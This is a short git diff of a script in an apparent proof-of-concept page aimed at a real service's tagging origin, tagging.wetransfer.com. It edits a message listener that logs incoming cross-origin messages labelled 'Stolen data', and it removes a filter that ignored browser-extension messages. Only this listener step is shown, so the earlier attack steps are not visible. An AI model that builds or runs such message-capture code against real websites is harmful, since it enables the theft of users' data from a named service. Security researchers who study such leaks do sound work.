@@ -59,20 +59,12 @@
 
         // 4. Listen for responses
         window.addEventListener('message', (e) => {
-                        console.debug('[DEBUG] Received message event:', e);
-                        // Ignore messages sent by Wappalyzer
-                        if (
-                            (e.data && typeof e.data === 'object' && e.data.wappalyzer) ||
-                            (e.source && e.source.name === 'wappalyzer')
-                        ) {
-                            console.debug('[DEBUG] Ignored Wappalyzer message:', e.data);
-                            return;
-                        }
-                        if (e.origin !== 'https://tagging.wetransfer.com') {
-                                console.log('[INFO] Stolen data:', e.data);
-                        } else {
-                                console.log('[INFO] Message from trusted origin:', e.data);
-                        }
+            console.debug('[DEBUG] Received message event:', e);
+            if (e.origin !== 'https://tagging.wetransfer.com') {
+                console.log('[INFO] Stolen data:', e.data);
+            } else {
+                console.log('[INFO] Message from trusted origin:', e.data);
+            }
         });
 
   </script>
